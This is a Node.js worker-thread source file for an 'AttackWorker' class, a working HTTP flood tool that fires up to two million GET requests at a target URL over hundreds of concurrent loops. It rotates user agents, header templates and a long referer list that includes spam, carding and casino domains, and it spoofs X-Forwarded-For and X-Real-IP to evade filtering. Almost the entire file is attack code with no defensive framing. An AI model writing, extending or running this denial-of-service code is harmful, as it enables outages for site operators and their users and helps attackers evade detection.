const { workerData, parentPort } = require('worker_threads');
const fetch = require('node-fetch');
const { URL } = require('url');

class AttackWorker {
  constructor(data) {
    this.attackId = data.attackId;
    this.targetUrl = data.targetUrl;
    this.threads = Math.min(data.threads, 500);
    this.totalRequests = Math.min(data.totalRequests, 2000000);
    this.userAgents = data.userAgents || [];
    this.proxies = data.proxies || [];
    
    this.sentRequests = 0;
    this.successfulRequests = 0;
    this.failedRequests = 0;
    this.isRunning = true;
    this.semaphore = this.createSemaphore(1000);
    
    this.headersTemplates = [
      {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Cache-Control': 'max-age=0'
      },
      {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1'
      },
      {
        'Accept': 'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
        'Accept-Language': 'en-US,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
      }
    ];

    this.referers = [
      'https://www.google.com/',
      'https://www.youtube.com/',
      'https://www.facebook.com/',
      'https://www.twitter.com/',
      'https://www.reddit.com/',
      'https://www.github.com/',
      'https://www.amazon.com/',
      'https://www.netflix.com/',
      'https://www.google.com/',
    'https://www.youtube.com/',
    'https://www.facebook.com/',
    'https://www.twitter.com/',
    'https://www.instagram.com/',
    'https://www.bing.com/',
    'https://www.yahoo.com/',
    'https://www.baidu.com/',
    'https://www.wikipedia.org/',
    'https://www.reddit.com/',
    'https://www.amazon.com/',
    'https://www.linkedin.com/',
    'https://www.netflix.com/',
    'https://www.microsoft.com/',
    'https://www.apple.com/',
    'https://www.cloudflare.com/',
    'https://www.office.com/',
    'https://www.adobe.com/',
    'https://www.github.com/',
    'https://www.stackoverflow.com/',
    '0-0.fr',
    '007agent-i.fr',
    '01casino-x.ru',
    '033nachtvandeliteratuur.nl',
    '03e.info',
    '03p.info',
    '0n-line.tv',
    '1-88.vip',
    '1-99seo.com',
    '1-best-seo.com',
    '1-free-share-buttons.com',
    '100-reasons-for-seo.com',
    '100dollars-seo.com',
    '12-reasons-for-seo.net',
    '12masterov.com',
    '12u.info',
    '15-reasons-for-seo.com',
    '16lv.com',
    '1kreditzaim.ru',
    '1pamm.ru',
    '1st-urist.ru',
    '1webmaster.ml',
    '1wek.top',
    '1winru.ru',
    '1x-slot.site',
    '1x-slots.site',
    '1xbet-entry.ru',
    '1xbetcc.com',
    '1xbetonlines1.ru',
    '1xbetportugal.com',
    '1xbetts.ru',
    '1xslot-casino.online',
    '1xslot-casino.ru',
    '1xslot-casino.site',
    '1xslot.site',
    '1xslots-africa.site',
    '1xslots-brasil.site',
    '1xslots-casino.site',
    '1xslots.africa',
    '1xslots.site',
    '2-best-seo.com',
    '2-easy.xyz',
    '2-go-now.xyz',
    '24h.doctor',
    '24x7-server-support.site',
    '2your.site',
    '3-best-seo.com',
    '3-letter-domains.net',
    '3dgame3d.com',
    '3waynetworks.com',
    '4-best-seo.com',
    '40momporntube.com',
    '4inn.ru',
    '4ip.su',
    '4istoshop.com',
    '4webmasters.org',
    '4xcasino.ru',
    '5-best-seo.com',
    '5-steps-to-start-business.com',
    '5elementov.ru',
    '5forex.ru',
    '6-best-seo.com',
    '69-13-59.ru',
    '6hopping.com',
    '7-best-seo.com',
    '70casino.online',
    '7kop.ru',
    '7makemoneyonline.com',
    '7milliondollars.com',
    '7ooo.ru',
    '7zap.com',
    '8-best-seo.com',
    '84lv.com',
    '8xv8.com',
    '9-best-seo.com',
    '99-reasons-for-seo.com',
    'a-elita.in.ua',
    'abacoasale.xyz',
    'abaiak.com',
    'abcdefh.xyz',
    'abcdeg.xyz',
    'abclauncher.com',
    'abuser.shop',
    'acads.net',
    'acarreo.ru',
    'account-my1.xyz',
    'accs-store.ru',
    'actualremont.ru',
    'acunetix-referrer.com',
    'adanih.com',
    'adcash.com',
    'adelachrist.top',
    'adf.ly',
    'adpostmalta.com',
    'adrenalinebot.net',
    'adrenalinebot.ru',
    'adspart.com',
    'adtiger.tk',
    'adult-video-chat.ru',
    'adventureparkcostarica.com',
    'advertisefree.co.uk',
    'adviceforum.info',
    'advokateg.xyz',
    'aerodizain.com',
    'aerotour.ru',
    'affiliate-programs.biz',
    'affordablewebsitesandmobileapps.com',
    'afora.ru',
    'afshan.shop',
    'agro-gid.com',
    'agtl.com.ua',
    'ahecmarket.xyz',
    'ahhjf.com',
    'ai-seo-services.com',
    'aibolita.com',
    'aidarmebel.kz',
    'aimeesblog.xyz',
    'aimiot.net',
    'aitiman.ae',
    'akmussale.xyz',
    'akuhni.by',
    'albuteroli.com',
    'alcobutik24.com',
    'alertomall.xyz',
    'alexsander.ch',
    'alfabot.xyz',
    'alguiblog.online',
    'alibestsale.com',
    'aliexsale.ru',
    'alinabaniecka.pl',
    'aliviahome.online',
    'alkanfarma.org',
    'all-news.kz',
    'all4bath.ru',
    'allcryptonews.com',
    'allergick.com',
    'allergija.com',
    'allfan.ru',
    'allknow.info',
    'allmarketsnewdayli.gdn',
    'allnews.md',
    'allnews24.in',
    'allproblog.com',
    'allvacancy.ru',
    'allwomen.info',
    'allwrighter.ru',
    'alma-mramor.com.ua',
    'alp-rk.ru',
    'alphaopt24.ru',
    'alpharma.net',
    'altermix.ua',
    'amatocanizalez.net',
    'amazon-seo-service.com',
    'amos-kids.ru',
    'amp-project.pro',
    'amt-k.ru',
    'amtel-vredestein.com',
    'amylynnandrews.xyz',
    'anabolics.shop',
    'analytics-ads.xyz',
    'ananumous.ru',
    'anapa-inns.ru',
    'andrewancheta.com',
    'android-style.com',
    'animalphotos.xyz',
    'animenime.ru',
    'annaeydlish.top',
    'anrtmall.xyz',
    'anti-crisis-seo.com',
    'anticrawler.org',
    'antiguabarbuda.ru',
    'antonovich-design.com.ua',
    'anydesk.site',
    'aoul.top',
    'apilian.xyz',
    'apollon-market-url.org',
    'applepharma.ru',
    'apteka-doc.ru',
    'apteka-pharm.ru',
    'apteka.info',
    'arabic-poetry.com',
    'arcarticle.online',
    'arendadogovor.ru',
    'arendakvartir.kz',
    'arendovalka.xyz',
    'argo-visa.ru',
    'arkansale.xyz',
    'arkkivoltti.net',
    'arpe.top',
    'artblog.top',
    'artclipart.ru',
    'artdeko.info',
    'artpaint-market.ru',
    'artparquet.ru',
    'artpress.top',
    'artsmarket.xyz',
    'arturs.moscow',
    'aruplighting.com',
    'ascotgoods.xyz',
    'ask-yug.com',
    'astimvnc.online',
    'asupro.com',
    'asynt.net',
    'aszokshop.xyz',
    'atleticpharm.org',
    'atoblog.online',
    'atyks.ru',
    'aucoinhomes.com',
    'auto-b2b-seo-service.com',
    'auto-complex.by',
    'auto-kia-fulldrive.ru',
    'auto-seo-service.org',
    'autoblog.org.ua',
    'autofuct.ru',
    'automobile-spec.com',
    'autoseo-service.org',
    'autoseo-traffic.com',
    'autoseotips.com',
    'autoservic.by',
    'autovideobroadcast.com',
    'avcoast.com',
    'aviaseller.su',
    'aviva-limoux.com',
    'avkzarabotok.info',
    'avtointeres.ru',
    'avtorskoe-vino.ru',
    'avtovykup.kz',
    'aworlds.com',
    'axcus.top',
    'ayongoods.xyz',
    'azartclub.org',
    'azbukafree.com',
    'azlex.uz',
    'baciakte.online',
    'backlinks-fast-top.com',
    'bahisgunceladresi.com',
    'baixar-musicas-gratis.com',
    'baladur.ru',
    'balakhna.online',
    'balayazh.com',
    'balitouroffice.com',
    'balkanfarma.org',
    'bankhummer.co',
    'barbarahome.top',
    'bard-real.com.ua',
    'batietiket.com',
    'batut-fun.ru',
    'bavariagid.de',
    'bavsac.com',
    'bdf-tracker.top',
    'beachtoday.ru',
    'beauty-lesson.com',
    'beclean-nn.ru',
    'bedroomlighting.us',
    'belreferatov.net',
    'beremenyashka.com',
    'berglion.com',
    'berkinan.xyz',
    'best-deal-hdd.pro',
    'best-mam.ru',
    'best-ping-service-usa.blue',
    'best-printmsk.ru',
    'best-seo-offer.com',
    'best-seo-software.xyz',
    'best-seo-solution.com',
    'bestbookclub.ru',
    'bestfortraders.com',
    'besthatcheries.com',
    'bestmobilityscooterstoday.com',
    'bestofferhddbyt.info',
    'bestofferhddeed.info',
    'bestvpnrating.com',
    'bestwebsitesawards.com',
    'bet-winner1.ru',
    'bet2much.ru',
    'betslive.ru',
    'betterhealthbeauty.com',
    'bettorschool.ru',
    'bez-zabora.ru',
    'bezprostatita.com',
    'bhf.vc',
    'bibprsale.xyz',
    'bif-ru.info',
    'biglistofwebsites.com',
    'billiard-classic.com.ua',
    'billyblog.online',
    'bin-brokers.com',
    'binokna.ru',
    'bio-market.kz',
    'biplanecentre.ru',
    'bird1.ru',
    'bitcoin-ua.top',
    'biteg.xyz',
    'bitniex.com',
    'biz-law.ru',
    'bizru.info',
    'bki24.info',
    'black-friday.ga',
    'black-tip.top',
    'blackhatworth.com',
    'blancablog.online',
    'blockchaintop.nl',
    'blog.xsk.in',
    'blog100.org',
    'blog2019.top',
    'blog2019.xyz',
    'blog4u.top',
    'blogking.top',
    'bloglag.com',
    'blognet.top',
    'blogorganictraffic.shop',
    'blogseo.xyz',
    'blogstar.fun',
    'blogtotal.de',
    'blogtraffic.shop',
    'blogua.org',
    'blue-square.biz',
    'bluerobot.info',
    'bmusshop.xyz',
    'bo-vtb24.ru',
    'boltalko.xyz',
    'boltushkiclub.ru',
    'bonkers.name',
    'bonniesblog.online',
    'bonus-betting.ru',
    'bonus-spasibo-sberbank.ru',
    'bonus-vtb.ru',
    'books-top.com',
    'boost24.biz',
    'boostmyppc.com',
    'bostonline.xyz',
    'bot-traffic.icu',
    'bot-traffic.xyz',
    'botamycos.fr',
    'bottraffic.live',
    'bottraffic143.xyz',
    'bottraffic329.xyz',
    'bottraffic4free.club',
    'bottraffic4free.host',
    'bottraffic999.xyz',
    'bowigosale.xyz',
    'bpro1.top',
    'bradleylive.xyz',
    'brakehawk.com',
    'brateg.xyz',
    'brauni.com.ua',
    'bravica.biz',
    'bravica.com',
    'bravica.me',
    'bravica.net',
    'bravica.news',
    'bravica.online',
    'bravica.pro',
    'bravica.ru',
    'bravica.su',
    'break-the-chains.com',
    'briankatrine.top',
    'brickmaster.pro',
    'brillianty.info',
    'britneyblog.online',
    'brk-rti.ru',
    'brooklynsays.com',
    'brothers-smaller.ru',
    'brusilov.ru',
    'bsell.ru',
    'btcnix.com',
    'btt-club.pro',
    'budilneg.xyz',
    'budmavtomatika.com.ua',
    'bufetout.ru',
    'buhproffi.ru',
    'buildnw.ru',
    'buildwithwendy.com',
    'buketeg.xyz',
    'bukleteg.xyz',
    'bulgaria-web-developers.com',
    'bur-rk.ru',
    'burger-imperia.com',
    'burn-fat.ga',
    'business-online-sberbank.ru',
    'buttons-for-website.com',
    'buttons-for-your-website.com',
    'buy-cheap-online.info',
    'buy-cheap-pills-order-online.com',
    'buy-forum.ru',
    'buy-meds24.com',
    'buynorxx.com',
    'buypillsonline24h.com',
    'buypuppies.ca',
    'c2bit.hk',
    'call-of-duty.info',
    'cancerfungus.com',
    'candida-society.org.uk',
    'cannazon-market.org',
    'carder.me',
    'carder.tv',
    'carders.ug',
    'cardiosport.com.ua',
    'cardsdumps.com',
    'carezi.com',
    'carivka.com.ua',
    'carscrim.com',
    'cartechnic.ru',
    'cashforum.cc',
    'casino-top3.fun',
    'casino-top3.online',
    'casino-top3.ru',
    'casino-top3.site',
    'casino-top3.space',
    'casino-top3.website',
    'casino-v.site',
    'casino-vulkane.com',
    'casino-x-now.ru',
    'casino-x.host',
    'casinosbewertung.de',
    'casinox-jp.com',
    'c2bit.hk',
    'call-of-duty.info',
    'cancerfungus.com',
    'candida-society.org.uk',
    'cannazon-market.org',
    'carder.me',
    'carder.tv',
    'carders.ug',
    'cardiosport.com.ua',
    'cardsdumps.com',
    'carezi.com',
    'carivka.com.ua',
    'carscrim.com',
    'cartechnic.ru',
    'cashforum.cc',
    'casino-top3.fun',
    'casino-top3.online',
    'casino-top3.ru',
    'casino-top3.site',
    'casino-top3.space',
    'casino-top3.website',
    'casino-v.site',
    'casino-vulkane.com',
    'casino-x-now.ru',
    'casino-x.host',
    'casinosbewertung.de',
    'casinox-jp.com',
    'catherinemill.xyz',
    'catterybengal.com',
    'cattyhealth.com',
    'cauxmall.xyz',
    'cazino-v.online',
    'cazino-v.ru',
    'ccfullzshop.com',
    'celestepage.xyz',
    'cenokos.ru',
    'cenoval.ru',
    'certifywebsite.win',
    'cezartabac.ro',
    'chainii.ru',
    'chatmall.xyz',
    'chatrazvrat.ru',
    'chatroulette.life',
    'chcu.net',
    'cheap-trusted-backlinks.com',
    'cheapkeys.ovh',
    'cheappills24h.com',
    'chinese-amezon.com',
    'chip35.ru',
    'chipmp3.ru',
    'chizhik-2.ru',
    'chomexun.com',
    'ci.ua',
    'ciarustde.online',
    'cilolamall.xyz',
    'cityadspix.com',
    'citybur.ru',
    'cityreys.ru',
    'civilwartheater.com',
    'cleandom.in.ua',
    'clicksor.com',
    'climate.by',
    'clothing-deal.club',
    'club-lukojl.ru',
    'cmrrsale.xyz',
    'cmseshop.xyz',
    'coderstate.com',
    'codysbbq.com',
    'coeus-solutions.de',
    'coffeemashiny.ru',
    'coinswitch.cash',
    'coleso.md',
    'collectinviolity.com',
    'columb.net.ua',
    'commentag.com',
    'commerage.ru',
    'comp-pomosch.ru',
    'compliance-alex.xyz',
    'compliance-alexa.xyz',
    'compliance-andrew.xyz',
    'compliance-barak.xyz',
    'compliance-brian.xyz',
    'compliance-don.xyz',
    'compliance-donald.xyz',
    'compliance-elena.xyz',
    'compliance-fred.xyz',
    'compliance-george.xyz',
    'compliance-irvin.xyz',
    'compliance-ivan.xyz',
    'compliance-john.top',
    'compliance-julianna.top',
    'computer-remont.ru',
    'comuneshop.xyz',
    'conciergegroup.org',
    'concretepol.com',
    'connectikastudio.com',
    'constanceonline.top',
    'cookie-law-enforcement-aa.xyz',
    'cookie-law-enforcement-bb.xyz',
    'cookie-law-enforcement-cc.xyz',
    'cookie-law-enforcement-dd.xyz',
    'cookie-law-enforcement-ee.xyz',
    'cookie-law-enforcement-ff.xyz',
    'cookie-law-enforcement-gg.xyz',
    'cookie-law-enforcement-hh.xyz',
    'cookie-law-enforcement-ii.xyz',
    'cookie-law-enforcement-jj.xyz',
    'cookie-law-enforcement-kk.xyz',
    'cookie-law-enforcement-ll.xyz',
    'cookie-law-enforcement-mm.xyz',
    'cookie-law-enforcement-nn.xyz',
    'cookie-law-enforcement-oo.xyz',
    'cookie-law-enforcement-pp.xyz',
    'cookie-law-enforcement-qq.xyz',
    'cookie-law-enforcement-rr.xyz',
    'cookie-law-enforcement-ss.xyz',
    'cookie-law-enforcement-tt.xyz',
    'cookie-law-enforcement-uu.xyz',
    'cookie-law-enforcement-vv.xyz',
    'cookie-law-enforcement-ww.xyz',
    'cookie-law-enforcement-xx.xyz',
    'cookie-law-enforcement-yy.xyz',
    'cookie-law-enforcement-zz.xyz'
    ];
  }

  createSemaphore(max) {
    let counter = 0;
    const waiting = [];
    
    return {
      async acquire() {
        if (counter < max) {
          counter++;
          return;
        }
        await new Promise(resolve => waiting.push(resolve));
      },
      release() {
        counter--;
        if (waiting.length > 0) {
          waiting.shift()();
        }
      }
    };
  }

  generateRandomIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
  }

  getRandomUserAgent() {
    if (this.userAgents.length > 0) {
      return this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
    }
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
  }

  getRandomHeaders() {
    const template = this.headersTemplates[Math.floor(Math.random() * this.headersTemplates.length)];
    const headers = { ...template };
    
    headers['User-Agent'] = this.getRandomUserAgent();
    headers['X-Forwarded-For'] = this.generateRandomIP();
    headers['X-Real-IP'] = this.generateRandomIP();
    headers['Referer'] = this.referers[Math.floor(Math.random() * this.referers.length)];
    
    // Add some random headers
    if (Math.random() > 0.5) {
      headers['X-Requested-With'] = 'XMLHttpRequest';
    }
    if (Math.random() > 0.7) {
      headers['X-CSRF-Token'] = Math.random().toString(36).substring(7);
    }
    
    return headers;
  }

  async sendRequest() {
    if (!this.isRunning || this.sentRequests >= this.totalRequests) {
      return false;
    }

    const requestId = ++this.sentRequests;
    
    try {
      await this.semaphore.acquire();
      
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 7000);
      
      const headers = this.getRandomHeaders();
      
      const options = {
        method: 'GET',
        headers: headers,
        signal: controller.signal,
        redirect: 'follow',
        follow: 5,
        timeout: 7000
      };

      // Try proxy if available
      if (this.proxies.length > 0 && Math.random() > 0.7) {
        const proxy = this.proxies[Math.floor(Math.random() * this.proxies.length)];
        // Note: Implement proxy support if needed
      }

      const response = await fetch(this.targetUrl, options);
      clearTimeout(timeout);
      
      this.successfulRequests++;
      
      // Send progress update every 100 requests
      if (requestId % 100 === 0) {
        parentPort.postMessage({
          type: 'progress',
          sent: this.sentRequests,
          successful: this.successfulRequests,
          failed: this.failedRequests
        });
      }
      
      return true;
    } catch (error) {
      this.failedRequests++;
      
      // Send progress update on significant errors
      if (requestId % 50 === 0) {
        parentPort.postMessage({
          type: 'progress',
          sent: this.sentRequests,
          successful: this.successfulRequests,
          failed: this.failedRequests
        });
      }
      
      return false;
    } finally {
      this.semaphore.release();
    }
  }

  async workerTask() {
    const promises = [];
    
    for (let i = 0; i < this.threads; i++) {
      promises.push(this.workerLoop());
    }
    
    await Promise.all(promises);
    
    // Send final completion message
    parentPort.postMessage({
      type: 'complete',
      sent: this.sentRequests,
      successful: this.successfulRequests,
      failed: this.failedRequests
    });
  }

  async workerLoop() {
    while (this.isRunning && this.sentRequests < this.totalRequests) {
      await this.sendRequest();
      
      // Add small random delay to avoid overwhelming
      if (Math.random() > 0.3) {
        await new Promise(resolve => setTimeout(resolve, Math.random() * 100));
      }
    }
  }

  stop() {
    this.isRunning = false;
  }
}

// Initialize worker
if (workerData) {
  const attackWorker = new AttackWorker(workerData);
  
  // Handle messages from parent
  parentPort.on('message', (message) => {
    if (message === 'stop') {
      attackWorker.stop();
    }
  });
  
  // Start the attack
  attackWorker.workerTask().catch(error => {
    parentPort.postMessage({
      type: 'error',
      error: error.message
    });
  });
}